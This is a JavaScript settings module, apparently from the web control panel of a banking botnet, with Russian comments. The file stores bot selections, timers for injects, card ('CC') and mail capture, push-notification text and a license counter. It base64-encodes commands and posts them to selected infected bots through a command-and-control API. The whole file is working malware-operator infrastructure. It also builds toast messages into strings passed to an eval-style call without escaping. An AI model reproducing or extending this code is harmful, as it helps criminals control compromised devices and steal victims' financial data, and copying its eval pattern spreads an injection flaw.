import Cookies from 'js-cookie';
import { try_eval } from './serviceF';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
// Самый главный файл, глобальные функции и переменные, которые не перезаписываются до обновления страницы
Array.prototype.remove = function() { // надо эту парашу доделать, и в глобальные вывести
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};
// Костыль, да и хуй с ним
let SettingsContext = {
    panelVersion: "1.6.0.3",
    firstLoad: false,
    autoUpdateDelay: 10000, // 10 секунд
    autoUpdateEnable: true,
    restApiUrl: Cookies.get('restApiUrl'),
    licensedays: 0,
    lastBotVersion: null,
    youBotVersion: '1.0.2.2',
    SelectedBots: [],
    BotsOnPage: [],
    BotsFilterMode: '00000000',
    BotsPerPage: '25',
    timeInject: 10,
    timeCC: 20,
    timeMail: 30,
    arrayUrl: '',
    pushTitle: '',
    pushText: '',
    timeProtect: '',
    AccessKey: '',
    CurrentSetBot: '',
    UpdateInjectsHash: '',
    UpdateTableHash: '',
    CurrentLogType: '',
    BotsSelected() {
        if(this.SelectedBots.length != 0) {
            return true;
        }
        this.ShowToast("warning", "Please select bots");
        return false;
    },
    UpdateInjectsTable() {
        this.UpdateInjectsHash = Math.random().toString();
    },
    UpdateTable() {
        this.UpdateTableHash = Math.random().toString();
    },
    ShowToast(status, message) {
        try_eval('toastr["' + status + '"]("' + message + '")');
    },
    ShowToastTitle(status,title, message) {
        try_eval('toastr["' + status + '"]("' + message + '","' + title + '")');
    },
    BotSendCommandCallBack(command, callback) {
        if(!this.BotsSelected()) { // check selected bots
            return;
        }
        let botsList = '';
        this.SelectedBots.forEach(function(element) {
            botsList += element + ',';
        });
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(
                    '{"request":"botsSetCommand","idbot":"' + 
                    botsList.substring(0, botsList.length - 1) + 
                    '","command":"' + new Buffer(command).toString('base64') + 
                    '"}'
                ).toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)) {
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else {
					if(isNullOrUndefined(callback)) {
						SettingsContext.ShowToastTitle('success', 'Info', result.message);
					}
					else {
						callback(result);
					}
				}
			
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error send bot command - ' + command + '. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    },
    BotSendCommand(command) {
        this.BotSendCommandCallBack(command, null);
    },
    SaveSettingsCookies() {
        if(this.BotsPerPage=='') {
            this.BotsPerPage = '10';
        }
        Cookies.set('autoUpdateTimeout', this.autoUpdateDelay);
        Cookies.set('BotsPerPage', this.BotsPerPage);
        Cookies.set('BotsFilterMode', this.BotsFilterMode);
        Cookies.set('restApiUrl', this.restApiUrl);
    },
    SaveSettingsServer() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(
                    '{"request":"editGlobalSettings",' + 
                    '"arrayUrl":"' + this.arrayUrl + '",'+
                    '"timeInject":"' + this.timeInject + '",'+
                    '"timeCC":"' + this.timeCC + '",'+
                    '"timeMail":"' + this.timeMail + '",'+
                    '"timeProtect":"' + this.timeProtect + '",' +
                    '"updateTableBots":"' + this.autoUpdateDelay + '",'+
                    '"pushTitle":"' + this.pushTitle + '",'+
                    '"pushText":"' + this.pushText + '"}'
                ).toString('base64')
            }
        });
        
        request.done(function(msg) {
            let result = JSON.parse(msg);
            if(!isNullOrUndefined(result.error)) {
                SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
            }
            else {
                SettingsContext.ShowToastTitle('success', 'Info', result.message);
            }
        }.bind(this));
    }
};

function LoadConfigFile() {
    let request = $.ajax({
        type: 'GET',
        url: '/config.json'
    });

    request.done(function(jsondata) {
        try {
            SettingsContext.restApiUrl = jsondata.url;
            SettingsContext.licensedays = jsondata.license;
            //SettingsContext.lastBotVersion = jsondata.lastBotVersion;
            SettingsContext.SaveSettingsCookies();
        }
        catch (err) {
            console.log(err);
            SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading config file');
        }
    }.bind(this));
}

if(!SettingsContext.firstLoad)
{
    LoadConfigFile();
    SettingsContext.firstLoad = true;
    if(!isNullOrUndefined(Cookies.get('autoUpdateTimeout'))) {
        let timeout = Cookies.get('autoUpdateTimeout');
        if(timeout == 0) {
            SettingsContext.autoUpdateDelay = 0;
            SettingsContext.autoUpdateEnable = false;
        }
        else {
            SettingsContext.autoUpdateDelay = timeout;
            SettingsContext.autoUpdateEnable = true;
        }
    }
    if(!isNullOrUndefined(Cookies.get('BotsPerPage'))) {
        SettingsContext.BotsPerPage = Cookies.get('BotsPerPage');
    }
    if(!isNullOrUndefined(Cookies.get('BotsFilterMode'))) {
        SettingsContext.BotsFilterMode = Cookies.get('BotsFilterMode');
    }
}

export default SettingsContext;
